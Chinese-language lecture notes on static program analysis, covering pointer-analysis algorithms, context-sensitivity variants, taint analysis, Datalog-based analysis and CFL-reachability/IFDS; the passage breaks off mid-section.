target是一个元组，即所有可能的方法，如果对于常量传播而言，得到的结果就是NAC，因此有了指针分析。只有一个call target\nPointer Analysis：一个指针可能指向哪些对象。 但是这不也是不准确的么\n指针分析分析的是啥？\njava中的指针主要有4类\n本地变量\nstatic field :C.f\nInstance field: x.f\nArray element: array[i]\n\n\n只分析直接影响指针的，pointer-affecting statements，有5种\nNew\nAssign\nx&#x3D;y\n\n\nStore\nx.f&#x3D;y\n\n\nLoad\ny&#x3D;x.f\n\n\nCall\nr&#x3D;x.k(a,…)\n\n\n\n\n\n\n指针分析的关键因素\nHeap abstraction\n把new抽象成创建点\n\n\nContext Sensitivity\n对调用的上下文进行建模\n\n\nFlow sensitivity\n如何对控制流进行建模？也就是是否关注程序的具体顺序\n\n\nAnalysis Scope\n1.分析整个程序\n2.只根据需求进行分析\n\n\n\n\n\n\n\n\nPointer Analysis Foundations （I）Point Analysis: RulesDomains and Notations\nPoints-to relations：理解为一个map\nKey 就是指针  value是相应指针的指针集\nRules\n横线上面的是条件，下面的是结论\nNew\n\n\n用oi表示创建出来的对象，所以让x指向oi，就是把pi加到x的指针集中\n\nAssign\n\n\ny指向一个对象，要让x也指向这个\n\nStore\n\n\n如果x指向oi，y指向oj，就让oi.f指向oj，也就是把oj加到oi.f的指针集中\n\nLoad\n\nx指向oi，oi的f执行oj，那就让y也指向oj\n\nHow to Implement Pointer Analysis指针分析的关键：当pt(x)变化时，把这种变化传播给x的相关指针\n解决方式：\n\n用graph去连接相关的指针\n当Pt(x)改变时，把指针变化的部分传播到 x的后继\n\nPointer Flow Graph(PFG)\n\n一个节点n代表一个变量，或者是一个抽象对象的field\n一条边x–&gt;y，意味着x的指向可能(may analysis)流到y的指向\n\n\n这个图中PFG Edges中的&lt;-，表示流动，意思是y的指针流到x\nPFG Examples根据左边的program，得到右边的图\n\n问题：下图中蓝色圈中为什么不能是c.f?\nc.f只是一个指针表达式，真正的指针是抽象创建点，而且这里其实也表示d.f，所以它只能是个抽象的点\n\n假设现在有一个新的表达式，创建点是j，那么最终会从b一直流到a和e\nImplementing Pointer Analysis\nPFG和指针信息相互依存\n指针分析得到的信息越多，PFG中的边也会越多，也会让指针分析的信息更多\n\n这里我理解会根据左边红色的构建PFG，然后还是假设b点有个指针集pt(b)&#x3D;{oj}，它也需要根据新构建出来的边，继续流动\n\nPointer Analysis：AlgorithmsAlgorithms（该算法目前不设计call method）\nWorklistWL：work list存储要处理的信息，里面是一个个的pair\n\n\noi要被加入到x的指针集中\n\nHandling of New and Assign先处理 new和 assign\n\n第一步：加边\n看红色部分\n首先对于 x &#x3D; new T()\n​\t- 那就是把oi，加入到x的指针集中\n对于 x &#x3D; y\n\n调用AddEdge函数，如果s -&gt; t不属于PFG，就在PFG上加一条边，注意这里的边是流向，而不是指向\n如果pt(s)不等于空，那也就是会流向t，也就是需要在t中，添加s的指针集，让t指向所有s能指向的地方\n\n第二步：处理worklist\n看上面算法的第二部分\n首先会做一个减法，也就是本来已经有的就不用动，只添加一些新的\n\n然后进行propogate\n\n圆圈1真正对指针集 进行了修改，把去重后的加入到n的指针集合中。\n此时对PFG进行遍历，找出n的所有后继节点s（也就是之后n会流向的地方），同样把&lt;s，pts&gt;加入到worklist中，后续进行处理，修改他们的指针集\nDifferential Propagation\n\n\n减少集合的操作量，如果在c处就算出来了，就不用之后每一步都算了\n\nHandling of Store and load\nif n represents a variable x 这句我没理解\n如果对于每个oi，有x.f &#x3D; y 或者 y &#x3D; x.f的语句，就加对应的边，和上面一样\nAlgorithms Review\n\n算法的本质是在修改指针集，和addedge\n两个是相辅相成的，待处理的会放到WL中\n\nAn Example\n用流不敏感来处理\n\n从new开始处理\n处理 x &#x3D; y的情况\n处理WL\n\n\n总结\n\nPointer Analysis foundations\n如何实现指针分析呢？ 关键是当x的指针集改变时，要把它传给和x相关的指针\n用一个graph去连接相关的指针，当pt(x)改变时，把改变传给x的后继\n\n\nPoint Flow Graph(PFG)\n通过指针信息构建PFG，PFG中的边表示流向，a-&gt;b表示a的指针集流到b，也就是在b的指针集中添加a的指向\n\n\n指针分析算法\n对于x &#x3D; new T(),add{x,{oi}}\n对于x&#x3D;y，就AddEdge(y,x)\n处理WL中的指针，和对应的指针集\n取出一个&lt;n,pts&gt;，用pts-ptn，只改变新添加的指针\n用Propagate方法\n将上面的差集加入到ptn中\nPFG中每个n节点的后继s，都把{s,差集}加入到WL中\n\n\n如果n代表一个变量x，也就是它有field\n对于x.f&#x3D;y，就AddEdge(y,oi.f)\n对于y&#x3D;x.f，就AddEge(oi.f,y)\n\n\n\n\nAddEdge(s,t)方法\n在PFG上添加s-&gt;t\n如果pt(s)不为空，就添加&lt;t,pt(s)&gt;到WL中\n\n\n\n\n\n\n\nPointer Analysis with Method CallsCHA：解决call targets通过a的declared type\nPointer Analysis：resolve call targets 基于pt(a)\n以前是根据CHA建call graph,那是会有假边\n现在根据指针分析来建call graph\nRulejvm在进行方法调用的时候，做的4件事\n\nDispatch\n\nReceived Object\n\n参数\n\n返回值\n\n\n\n\n首先x指向oi 调用点接着对oi和k进行Dispatch，目标是找到要调用的方法\n\n找到后，让oi 指向$pt(m_{this})$,也就是传receive object\n\n传参数 也就是把形参aj传给 $m_{pj}$（当前变量中的pj参数）\n\n传返回值，把$m_{ret}$传递给r\n\n\n问题：为什么不在x和this之间连一条边？(也就是黑色虚线为啥不是实线)\n\n\n假设x的指针集中  A B C三个调用点，且A B C三个类满足继承关系，那如果存在边，就会流过去，这也就让每个this的指针集中包括了{new A new B new C}，这显然是不合理的，每个类的this应该只有自己的类\n\n在每次算法执行时，oi是确定的某个对象(唯一的，只有一个)，然后针对这个对象做Dispatch，能够找到唯一的receive object\nInterprocedural Pointer AnalysisCall graph形成一个可达的世界：\n\n在效率上有提升：好处是不可达的方法说明程序中根本就不会用到，所以就不用分析\n\n在精度上有提升：对于不可达的方法，他们有关的指针集都是假的，因为永远也不会用到  \n\nEntry methods在最开始一定是可达的\n\n其他\n\n\nAlgorithms \n\n黄色的部分是新加的\n\n这里的$m^{entry}$方法，就理解成main方法，程序从main开始分析  \n\nRM：reachable methods 可达的方法 \n\nS: S是可达的语句的集合，也就是RM方法中的语句\n\n$S_m$: 方法m中的语句\n\nCG：call graph的边\n\nAddReachable：把新的方法加入到可达的世界中\n\n\nAddReachable啥时候被调用？\n\nentry方法是一开始的，肯定是可达，调用\n发现新的调用边的时候\n\n\n\n前面两行就是把新的方法加入到S集合中\n\n为什么在算法的一开始，不处理load 和 store语句，只处理New 和 assign呢\n因为像new和assign语句，你不需要知道他们的指针信息，就可以直接操作。\n但是对于 x.f &#x3D; y这样的语句，需要知道x的指针集信息，如果y指向oi，x指向oj，需要把y加入到oi.f中，但是此时一开始，x的指针集是空的\nProcessCall：就是在做上面那4件事\n\n 对于每个call site l :  x.k方法：\n\n用Dispatch找到对应的方法m\n把&lt;mthis,{oi}&gt;添加到WL \n如果 l -&gt;m不属于PFG，l是call site，m是目标方法 \n因为m是一个新的方法，所以要addreachable\n遍历m的每个形式参数pi(parameter)，连接实参(argument)和形参，addEdge\n传返回值从mret到r，addEdge\n\n\n\n问题：为什么oi是个新的对象，还要判断l-&gt;m是否属于call graph呢  \n因为这里的oj是x的定义类型，之前可能有oj，ok进来，就把这个边连接上了。没太懂。\n就是x的指针集中可能在oi之前 还有oj，就之前可能某一条语句让x和y指向了同一个地方，那Dispatch的结果如果是一样的，这条边就连接过了\n这里的l之前也是有可能处理过的\n因为每次x的指针集变化，就会在WL中添加东西，都会触发ProcessCall，就会执行l\nAn Example \n首先执行AddReachable方法，就是把{a,o3} {b,o4}添加到WL中\n接着对{a,o3}执行Propagate，因为a的指针集是空的，所以没什么变化。\n接着对{b,o4}执行Propagate，因为b的指针集也是空的，所以也没什么变化\n\n但是因为b是变量，执行ProcessCall\n\n对{b,o4}进行Dispatch，由于b是从o4流过来的，所以Dispatch的结果是B.foo(A)\n\n这里很好的体现了Pointer Analysis和CHA的区别，CHA是要对类和所有子类进行Dispatch，所以必然Dispatch的结果就不一样\n\n\n接着把{B.foo,{o4}}添加到WL ,添加一条边从5(行号)-&gt;B.foo(A) \n\n对m，调用AddReachable方法\n\n添加{B.foo(A)}到RM\n\n把所有的statement都加入到S中\n\n添加{r,o11}到WL\n\n\n\n添加边从a到y，在WL中加{y,o3}\n\n连接从r到c\n\n\n\n继续处理WL中的元素\n\n\n\n总结\nQ1：指针分析对于method call的规则\n\n做了4件事，Dispatch，传this，传参数，传返回值\n\nQ2：过程间的指针分析算法\nPointer Analysis Context Sensitivityproblem of Context-Insensitive  Pointer Analysis现在认为我们上一节学的指针分析就是上下文不敏感的指针分析\n\n对于动态分析来说，分析x.get的结果，返回的肯定是1，因为x指向的是new One\n对于常量传播而言，应用上节的指针分析算法，那么\n在调用x &#x3D; id(n1)时，会把形参n1的指针集{o1}传给n\n在调用x &#x3D; id(n2)时，会把形参n2的指针集{o2}传给n\n结束时，会把n的指针集传给x和y，因为call graph就是这样构建的，只要n改了，就会加到WL中，那必然x 和y也会改\n所以x的指针集就是{o1,o2}，对于常量传播而言,i就是NAC，结果就是不准的\n\n\n\n问题是：id返回的值没有做区分，把o1,o2都返回了，就是上下文不敏感，其实本质上是在传参AddEdge时，并没有指定具体的方法形参\n\n如果用上下文敏感进行分析 ，让n1指向的是id(n1)：n，这样结果就对了\n\nImprecision of Context Insensitivity (C.I.)Context Insensitivity不准的原因是：\n\n不同的方法调用的上下文不一样，如返回点，调用参数等\n\n不同的方法的变量可能指向不同的对象\n\n在CI的指针分析中，我们是直接传的，混在一起的，这里n被修改，导致x和y都被修改了\n\n\n\nContext Sensitivity (C.S.)\n引入它就是分析不同的数据流\n\n最古老的最好的上下文敏感技术是call-site sensitivity\n\n代表了call site的调用链中每个方法的上下文\n\n方法的 call site\ncaller 的call site\ncall of caller call site\n\n\n\nid就有2个上下文，2个call site\n\n\nCloning-Based Context Sensitivity\n在基于克隆的上下文敏感指针分析中，每个方法被被一个或多个上下文修饰\n实际上是在给变量加上下文\n相当于每个方法和它的变量都有了克隆\n\n\n\n这里的n就别clone 2次，这里就是用行号1 2对变量进行了标记，返回的时候，也会根据标记进行返回\n\nContext-Sensitive Heap\nOO程序(例如java)，它要频繁修改堆区，New的对象存储在堆里面\n所以要把上下文敏感应到到堆抽象中\n这里给每个oi，都添加了4个上下文\n\n\n为什么对heap应用上下文敏感可以提升精度呢？\n\n\n在动态执行中，一个调用点在不同的 call  context下可能创建多个对象\n那不同的对象可能有不同的数据流，存不同的值到他们的field中\n如果没有heap context sensitive，那么可能会merge  data flows，这点很重要，参考前面的，如果有两个调用newX，那么就会都流到y，\n\nAn ExmapleCS but no CS heap也就是上下文敏感，但是堆的上下文不敏感\n\n可以发现o8.f是o1, o2\n\n本质原因是因为在算法中，并没有对方法中new的对象的创建点进行区分，认为都是一个创建点。\n\n\n\nC.I. + C.S heap\n右边是有堆的上下文敏感的，此时可以看到 3:x指向的对象是3:O8，堆上下文进行了区分。\n如果你是对堆上下文敏感，但是对象上下文不敏感，x处还是3:o8,4:o8，因为没有对x进行区分\n根据算法对上面的过程画PFG：\n\nContext Sensitive Pointer Analysis: RulesDomains\nfield本身不需要上下文\n当引用具体的field时，引用的是具体的某个对象的field\n上下文敏感的指针：上下文敏感的变量 和上下文敏感的对象的field\n指针集：原来是对象的集合，现在是有上下文的对象\nRules（4种基本语句）\nAssign：\n在上下文c下的x和y，如果y指向c’下的oi，那x也指向c’下的oi。\nload：\n还是x和y在同样的上下文下，进行相关的操作\ncall之前学的是4件事\n\nDispatch\n传this\n传参数\n传返回值\n\n但是现在不一样了：\n\nDispatch：取目标函数\n选择上下文：根据调用点l，为目标方法m选择一个上下文\n\n这里就用了前面的clone技术，是call -site sensitivity，这里用行号表示上下文\n\n\n传receive object：把Dispatch的结果，传给$c^t$的this方法\n传参数：传给特定上下文的参数。$c下的a_j传给c^t下的m_{pj}$\n传返回值：把$c^t下的m_{ret}传给c下的r$\n\n关于上下文的理解：\n\n正常函数调用时，也会有特定的栈调用特定的函数，每调用一次有新的栈，这就是上下文敏感\n相当于进房间每次都从一个门进，也从同样的门出\n\n\nPointer Flow Graph with C.S.\nNodes：现在PFG中的节点都有上下文\nEdges：从一条边流到另一条边也是带有上下文的流动\nC.S. Pointer Analysis Algorithm该算法基本和C.I.的算法一样 \n\n为什么callee(被调用者)有上下文？\n\n因为要clone,保证多次调用不merge，不流到一处\n\n为什么call site也有上下文？\n\n一个call site在不同的上下文下，调用点方法可能不一样\n\n\n最开始给entry方法一个空的上下文\n这里为什么c:m不属于RM？\n为什么会有这种情况呢？\nSelect函数\n根据四个参数选\n\nc 上下文\nl callsite\nc’ oi：receive object\nm：Dispatch找到的方法\n\nSelect之后给this传receive object，就是让this指向现在的对象\n整个流程是忽略控制流信息的\n他只是拿的statements的集合，看整个流程，他也是先处理new ，处理 x &#x3D; y，再处理load store 方法调用，因此是flow insensitive\n未尽事宜\n想一想pointer Analysis算法中一些细节是为什么？\n默写一下指针分析的算法，和C.S.的pointer Analysis\n看一下谭老师指针分析2020的论文\n\nYue Li, Tian Tan, Anders Møller, and Yannis Smaragdakis. “A Principled Approach to  Selective Context Sensitivity for Pointer Analysis”. TOPLAS 2020\nContext Sensitivity Variant不是所有的技术都要考虑 Select的所有参数\n\nContext insensitivity\nC.I.是C.S.的一种特例，每次都返回一个空，也就是每次都一样，也就是上下文不敏感。\nCall-site Sensitivity\n\n每个上下文包含call sites的list，也就是一个调用链\n\n在一个method call中，他把call site加到caller的上下文中，作为callee 的上下文\n也就是是调用栈的抽象，(A.B.C.f方法)\n\n\n只需要Select的前两个参数，c表示当前的上下文，从l’ 到l’’，l表示现在的call site，把l加进去\n\n\nAn example\n问题：这里的void  bar()的上下文是什么？\n\n在bar()方法中，又调用了自己。\n也就是程序从9跳转到13时，此时上下文是[3,9]\n但是执行到15时，又调用了13，再执行13方法，此时就是[3,9,15],……\n那就会有无穷无尽的上下文，指针分析不能终止\n\nK-limiting Context Abstraction目的\n\n确保指针分析可以终止\n避免太多的上下文\n\n方法：设置一个上下文的边界 k\n\n每个上下文包括调用链中的最后k个call site\n对于method context k &#x3D; 2 ，对于 heap context k &#x3D;1\n\n\n对于上面的程序，k&#x3D;1时，void bar()的上下文是什么\n\n\n也就是只有当前的call site，没有之前的call chain，所以执行到13时上下文就只有9，再往下执行，又会执行一次void bar()，所以上下文是[9,15]\n\n对于k&#x3D;2时\n\n此时上下文是call chain中的最后一个l’’ +  当前的call site\n1-Call-Site: Example\n\n这里体现出了1-call-site 上下文敏感的作用，因为是1-call site，所以方法的上下文就是它的call site，没有之前的call chain\n\n\n\nO12 和  O13直接沿着PFG传下去\n\nC.I. VS C.S.(1-Call-Site)\nObject Sensitivity\n每个上下文包含一系列抽象的对象的list\n\n在一个method call中，使用receiver object和它的heap context作为callee context\n\nreveiver obejct +  heap context可以唯一确定一个对象\n\n\n\n\n\nAn Example\n为什么分析a1.set时，void doSet(B p)的上下文是o1呢？\n\n因为object sensitivity主要由heap context 和receiver object构成，整个代码中可以看到是没有heap context 的，因为并没有在方法中new 一个对象 \n所以只考虑receiver object,就是o1\n\n1-Call-Site vs Object Sensitivity\n\n对于这个程序来说，显然1- call site是不准的，因为1-call site认为当前的call site就是他的上下文，所以在调用doSet时，都会认为上下文是12\n而object sensitivity是准的，它始终会让this指向receiver object，在判断上下文的时候，也会用的是当前的receiver object，那在一个方法里，receive object都是一个this,所以是准的\n\n也就是1-call site只有一层，只记得上一层，二层方法调用就不好使了\nObject Sensitivity始终对象只有this\n\n\n但是这种情况下，1-Object就不准了，因为this用了两次，这两个this指向的是同一个receiver object，那就会给同样的上下文\n\n总结其实上面两种方法都很怕自己最关键的地方调用2次，就会merge\n\n1-call-site是，1已经用尽的情况下，调用了2次同样的方法，2次就会认为是同样的上下文。\n1-object是在同一个方法中，用了2次this,2个this都指向的是receiver object\n\nType Sensitivity大佬觉得上面两个还是不够快，于是研究了这种方法\n\n每个上下文包括一系列type的list:\n\n在一个method call中，使用包含receiver object的调用点的type，和它的heap context作为callee context\n是在object sensitivity之上一个粗粒度的抽象\n\n\n\n\n在这个例子中吗，InType(o3)表示的就是o3所在的类，就是包含了receiver object的调用点的类\nType vs Object Sensitivity\n因为它是基于object sensitivity，它的精度肯定小于等于object sensitivity\n\n\n对于object sensitivity，foo()的上下文是o3 o5 o7。\n如果对于Type Sensitivity,foo()的上下文只有X,他们的创建点都在X中。\n\nStatic Analysis for securityInformation Flow Security目标\n\n避免不想要的信息流\n\nAccess Control vs. Information Flow SecurityAccess Control\n\n检查程序是否有权限\n关心信息是如何访问的\n\nInformation flow security\n\n可以追踪信息的流动\n关心信息是如何传播的\n\nInformation Flow\n\n和前面学的一样，箭头表示信息的流动\n\nInformation Flow security\n定义程序中的变量不同的安全等级\n\nSecurity Levels\nH : 就是hight security，保密信息\nL : 就是low security，公开的可观察到的信息\n\n安全等级用lattice进行抽象：L&lt;&#x3D; H\nInformation Flow Policy下面是**J. A. Goguen and J. Meseguer, “Security policies and security models”. S&amp;P 1982.*论文中提出的policy\n限制信息在不同的security level之间如何流动\nNoninterference policy：非干涉\n\nhigh variables 不能影响 low variables的信息\n也就是说不能通过观测low variables的信息来推测出high variables中的信息\n\nNoninterference policy example\n\n\n上面红色的是不允许的，因为high variables流到了low variables\n\nConfidentiality and Integrity（保密性和完整性）保密性：防止信息流出去\n完整性：防止其他信息流进来，造成污染，污染了信息就不完整了\n\nIntegrity涉及到了很多外部数据的注入，违反数据的完整性，CTF中常用的方法\n\nCommand injection\nSQL inhecttion\nXss\n\nConfidentiality and Integrity\nIntegrity 更广泛的定义\n准确性：保护数据不被污染\n完全性：对于数据库系统，防止数据丢失\n一致性：对于文件传输系统，发送方和接收方需要是一样的\n\nExplict Flows and Covert Channels（显示流和隐藏信道）\n前面这种直接赋值的方式就是显示流\n\n对于这个程序，我们可以通过public来判断secret是否大于0，这就有了信息的流动，这种就是implicit flow隐式流。\nDoes Secret Information Leak？\n第二个可以通过执行时间判断，secret &lt; 0，会稳定的增加程序的执行时间\n最后一个如果secret 小于0，一定会爆出数组越界，所以也是会泄露信息。\nConvert&#x2F;Hidden Channels\n隐藏信道意思就是他的最初的目的不是为了传递信息，这种叫隐藏信道\n\n\nExplicit Flows and Convert Channels\n\n对于显示流，一下子泄露的是32bits的信息，但是对于隐式流，只是泄露1bit的信息\n所以现在集中于如何避免这些不想要的信息流，就是不让他胡乱传播。\n\nTaint Analysis(污点分析)把程序中的数据标记成两种：\n\n对于感兴趣的数据，给他打上标签，叫做污点数据\n其他的数据，叫非污点的数据\n\n污点数据的源是source，实际上，通常污点数据来自于一些方法的返回值\n污点分析就是追踪数据如何流动的，把它流到的位置叫sink，实际上sink通常是一些敏感的方法\nTaint Analysis ：Two Applications\n保护保密性：\n\nSource：secret data的source\nSink：泄露的地方\n针对Information leaks问题\n\n保护完整性：\n\nSource：不可信的数据source\nSink：critical computation(关键计算)\n针对Injection erros\n\nTaint Analysis and Pointer Analysis, Together*\n污点分析关注的问题是污点数据能否流到sink处？\n换种方式就是，sink的指针是否指向tainted data？\n\n！！！这不就来了么，这不就和前面学的指针分析非常非常像！\n\n隐藏内容\n污点分析关注污点数据在程序中如何流动\n指针分析关注抽象的对象在程序中如何流动\n\n\n那怎么做呢，如何结合呢？\n\n把污点数据当成是特殊的object\n把source当成是allocation sites\n利用指针分析去传播污点数据\n\nDomains and Notations\n这里以C.I.为例，结合指针分析和污点分析\n\n在域中新加入了Tainted data，污点数据\nti表示call site i 的tainted data\n\nTaint Analysis：Inputs &amp; OutputsInputs：\n\nSources：a set of source methods（调用返回污点数据的方法）\nSinks：a set of sink methods（污点数据流到的违反了security polices的方法）\n\nOutputs：\n\nTaintFlows：一系列污点数据的集合和sink 方法\n\n 例如&lt;ti,m&gt;属于TaintFlows，表明来自调用点i(source method)的污点数据可能流到sink method m\nRules：Call处理source\n\n这里的l理解成调用点，m理解成调用的目标方法，如果目标方法是Source，就把tl加到r的指针集中\n\n\nRules：Same As Pointer Analysis处理传播\n\nRules：Call\n处理Sink\n\n从CAll graph中取出目标方法\n如果目标方法属于Sink，如果参数中有污点数据，就把他加到TaintFlows\n\nAn Example\n\n因为认为getPassword是一个Sink，所以根据Rule，会把t3加入到pw的指针集中\n\n对于第七行log，因为log是一个sink方法，所以会检查他的参数s,s指向t3，而t3是一个污点的数据，在pw的指针集中。\n\n所以把&lt;t3,log(String)&gt;加入到TainfFlows中，表示t3这个污点数据会流到log(String)方法中，会泄露出去。也可以通过PFG发现整个泄露的流程\n但是指针分析也有处理不了的方法，比如这个”+”，append方法，就没法处理\n\n\n\n\nDatalog-Based Program AnalysisMotivationImperative vs Declarative(命名式 vs 声明式)\nImperative：怎么做，java c++都是声明式语言\n\n\nDeclarative：做什么，SQL\n\n\n\nPointer Analysis Imperative Implementation 如果要用命名式的语言实现指针分析，也就是具体的写一个代码，需要非常多细节的东西。\nPointer Analysis Declarative Implementation\n如果用datalog，就会很简单\n\nDatalog\n是一种声明式的逻辑程序语言\n\n\n\n没有赋值\n没有控制流\n没有函数\n不是图灵完备的\n\nPredicates(Data) 谓词\nDatalog中，Predicates 位词（也可以叫relation）是一些列陈述的集合\n谓词是a table of data\n一个 fact 就是一个table中的一个tuple(元组)，通俗说就是属于这个表中的一条数据\n\n\n\n显然根据这个例子，Xiaoming,18是一个fact，Abao,23不是一个fact\n\nAtoms（元值，最小不可切分的一部分）\nAtoms是Datalog中基本的元素，Atoms是Datalog的predicate\n\n\n\nTerms\n可以说变量：代表任意一个值 ，Age(person,age)\n也可以是常量 ，Age(“Xiaoming”,18)\n\n\n\nP(X1,X2,…,Xn)是relational atom(关系型元词)\nAge(“Xiaoming”,18)就是relational atom(关系型元词)\n除了关系型元词，还有算数型元词\n\nage &gt;&#x3D; 18\n\nDatalog Rules(Logic)\nRule是表示逻辑推理的方法\n\nRule也用来具体说明fact是如何推断出来的\n\nrule的形式是：\n\n\n这里意味着从Body推出head，如果body是真的，那么head是真的\n\n这里的逗号看成逻辑与\n\n\nInterpretation of Datalog Rules\n考虑子目标中所有可能的组合\n如果一个组合让所有的subgoals都是true，那这个head astom也是真的\n这个head的predicate包含了所有的true astorm\n\n\n对于一个Datalog program，就是Facts + Rules\n\n问题：那最开始的fact咋来的呢？\nEDB and IDB Predicatesdatalog中提供了2种谓词\n\nEDB（Extensional database 外部数据库）\n谓词是最开始被定义的\nrelations是可以枚举的\n看成是input relations，因为是输入的，所以不需要经过推理\n\n\nIDB（intensional database ）\n谓词是通过rules建立的\nrelations是由规则判断的\n能被看成是输出的relations，通过rules推导出来的\n\n\n\n\nLogical OrDatalog中有两种表达Logical or的方式\n\n在头部写多个Rules\n\n\n\n使用逻辑 or 操作符 分号 ; \n\n\n\n逻辑or的优先级比逻辑与and低\nNegation(逻辑非)\n\n\n对于计算补考的学生，就用Student(student),!PassedStd(student)\n\nRecursion\nDatalog支持递归的规则\n这也就意味着IDB predicate能从它自身推断出来\n\n\n例如，我们可以通过递归的规则计算图的可达性\n\n\n\n已知Edge(a,b)是从a到b之间有一条边，Reach(a,b)是从a可以到b\n那么可以推导出Reach(from,to)，从from到node可达，且从node到to之间有一条边，那么从from到to就可达\n\n有了递归的好处在于\n\n如果没有，就像sql一样，只能表达基本的查询\nselect from  where\n\nRule Safety\n对于这两个rules，B(y)可以理解成在B中\n\n首先左边满足B,且x &gt;y，但是并没有限制x，所以会穷举所有的x，所以是无穷的\n对于右边的，同样是无穷的\n\n这种情况下，会让A也是无穷的，Datalog一直在计算\nDatalog规定的规则：\n\nA rule是safe当每个变量至少出现在一个non-nagated relations atom中。就是不出现在非中\n因为非是一个无穷的集合，所以要不出现在非中\n\n\n上面两个rules是safe\ndatalog只允许写下安全的rules\n\nRecursion and Negation\n在这个例子中，如果B(1)是true，\n\n假设A(1)是false，这又推导出A(1)是true。\n\n假设A(1)是false, A(1)又是true\n\n\n所以这互相矛盾。\n因此，Datalog中，递归和一个atom的非必须是分开的。\nExecution of Datalog Programs\n\n通过输入EDB和Rules，在datalog engine中，直到没有新的IDB生成\n单调性：只会有越来越多的facts，facts不会被删除\n一定会终止：\n因为是单调的\n根据rule safety，是不允许它一直递归下去的\n\n\n\nPointer Analysis via DatalogEDB：指针分析中的EDB就是指针相关的信息\nIDB：指针分析的结果\nRules:指针分析的rules\n\nAn Example形成EDB\n把程序变成谓词\n\n\nDatalog Rules for Pointer Analysis\n\n红色表示已知的，蓝色表示推导出的结果\n这就可以看出用datalog实现pointer analysis十分的简洁\n\n具体实现(算法)\n\n首先判断符合new的语句，枚举表中的所有情况，在varPointsTo中添加，b o1 ,c o3\n\n\n\n应用assign的规则\n\n\n\n应用store：\n\n\n\n应用load\n\n\n根据已有fact，应用rules，得到更多的fact,实际执行时候是不断迭代的，有新的rules能调用，就调用，并不是上面写的算法的过程。\nHandle method calls\nThisVar：存在是this指针，m就是方法，this就是变量\n由于方法调用是做4件事，这里也是在做4件事，这里用了3个rule\n第一个Rule:Dispatch，传this\n\nEDB:\n\n首先是一个virtucal call，l：表示调用点，也是Label，x是变量，k是方法\nVarPointsTo表示x指向oi\n利用Dispatch表，找到了目标方法m\n根据ThisVar表，得到了this\n\nIDB：\n根据上面的输入，得到了\n\n传this，也就是this也指向o\n把m方法加到Reachable中\n\n第二个Rule：传参数\nArgument：l是调用点,i表示第几个，下标，,a实参\nParameter：m是放，i表示第几个，下标，p形参\n\n第三个Rule：传返回值\n\n\n根据CallGraph获取方法m\n获取m方法的返回值\n获取返回值的指针\n获取接收的方法，把o传给接收的方法\n\n对于全程序的指针分析\n\n入口方法一定是可达的，所以要加一个EntryMethod\n\n对于new，要加一个Reachable，只有方法可达，才处理\n\n\n那为什么只有new加了Reachable呢？\n\n因为其他方法都有VarPointsTo，如果方法不可达，那VarPointsTo肯定为假，所以也就不会触发相关的load store语句\n\nTaint Analysis via Datalog\n在指针分析的基础上\n\n需要Source\n需要Sink\nTaint：关联每个call site到污点数据的call site\n\nIDB predicate\n\nTaintFlow(t:T, m : M )表示t这个污点数据会流到sink method m处\n\nHandle Sources and Sinks\nHandle sources：\n\nCallGraph：l , m\n现在告诉我m是个Source方法\n接收变量是r\nTaint告诉我现在在l 处产生了一个污点数据t\n因此把r 指向t\n\n\n\n取出调用边\n现在m方法的第i个参数是个Sink\n取出第i个的实参\n取出它的指针集\n从Taint中取出它的label  j \n推导出从j处来的可能流到l调用点处的第i个参数中。\n\n本质上就把EDB理解成表，所以EDB的rules就是在查表，IDB就是通过查表得出来的结论。\n总结优势：\n\n代码可读性很强\n隐藏了很多细节，所以很容易实现\n从优化的引擎中可以获益\n\n缺点：\n\n限制了表达逻辑，有些情况不能表达\n不能完全控制，因为中间是个引擎，是个黑盒子\n\n\nCFL-Reachability and IFDSInfeasible Paths：\n\nPFG中不会被执行的边\n\n给定一个path，在静态时无法判断一条path是不是假边\n\n根据语义，age是年龄，那就一定大于0，所以右边这条红色的一定不会被执行。这样的path是infeasible path。\n\n\n考虑上下文不敏感的情况，那x 和y的结果会有-1。\n\n指针分析中最右边走r的路径仍然不可避免。\n\n但是因为上下文不敏感导致错误的返回是可以避免的\n\n\nRealizable Paths\nRealizable Paths：return应该和相应的call匹配\n\nRealizable path可能不会被执行，但是unealizable path应该一定不能被执行(也就是从1的call进来，不能从2的return出去)\n\n因此现在的目标就变成了找到Realizable path\n那如何找呢？\nCFL-Reachability\nCFL-Reachability(context free language)Context-free grammar(CFG)CFG是形式语言的描述方法，CFG 中的产生式规则由两部分组成：一个非终结符和一个由终结符和非终结符组成的符号串\n​\t\t$S-&gt;\\alpha$\nS表示非终结符，$\\alpha$表示终结符或者非终结符，或者空。\n\nCFL-Reachability用括号匹配的方式完成上面提出的问题，实现每一个call都对应它的return。\n\n通过CFL进行括号匹配\n\n每个右括号都要有一个左括号，但是不是每一个左括号都有一个右括号\n因为前面表示return要有对应的call，先有了左括号，才会有右括号的事。但是不是有左括号，就一定有右括号，因为可能程序还没有执行到return。\n\n\n每个call site i，call edge是 (i，return edge 是)i，给每个edge都加了一个Label，也就是括号\n\n\nA path是一个realizable path，如果path的word在Language L中。\n推导这个匹配的过程\n对于realizable\n\n对于1，realizable -&gt; matched realizable，mathed就是已经匹配的，对应1中的绿色部分\n第一个式子，就是个递归，realizable -&gt; $(_i realizable$,也就可以匹配多个单括号的情况，也就是2\n\n对于matched：\n\nmatched 可以是一个e，也就是对应3  的情况\n也可以是一个$\\varepsilon$，就是很多很多e\n最后这个matched matched对应4的情况\n\n\n\n应用上面的规则，左边就是realizable path，右边就不是realizable path\n\nIFDSA Program Analysis Framework via Graph Reachablity\n\n通过图可达性进行程序分析\n\n\nIFDS是interprocedural,Finite,Distributive, Subset Problem\n\ninterprocedural：全程序分析\n\nFinite： domain是finite\n\ndistributive：分发的\n\n\nIFDS提供了MRP solution。\nMeet-Over-All-Realizable-Paths（MRP）\n\nMOP是所有边都应用transfer function\nMRP是只对realizable path应用transfer funciton\n\nOverview of IFDS\n是一个程序分析框架\n给定一个程序P，和一个分析问题Q\n\n构建一个supergraph，理解成前面讲的ICFG，并且定义了flow function，也就是图1中蓝色的部分\n构建一个**exploded supergraph **G#，把flow function转换成了representation relations\n最后在G#上遍历，解决Q\n\n最后，n是一个program point，d属于MRP，如果有一个realizable path在G#中，从S的main方法到n\nSupergraph\nG*代表supergrah\n\nG*是一个collection，包括所有的G1,G2\n每个Gp都有一个start node 和一个exit node\n把call方法变成了一个call node 和一个return site node\n\n\n这里有3种边\n\nintraprocedural call-return edge：紫色部分\ncall-to-start edge：绿色边\nexit-to-return edge：蓝色边\n\nDesign Flow Functions$\\lambda$-expressions\n\n\n是一个匿名函数\n$\\lambda 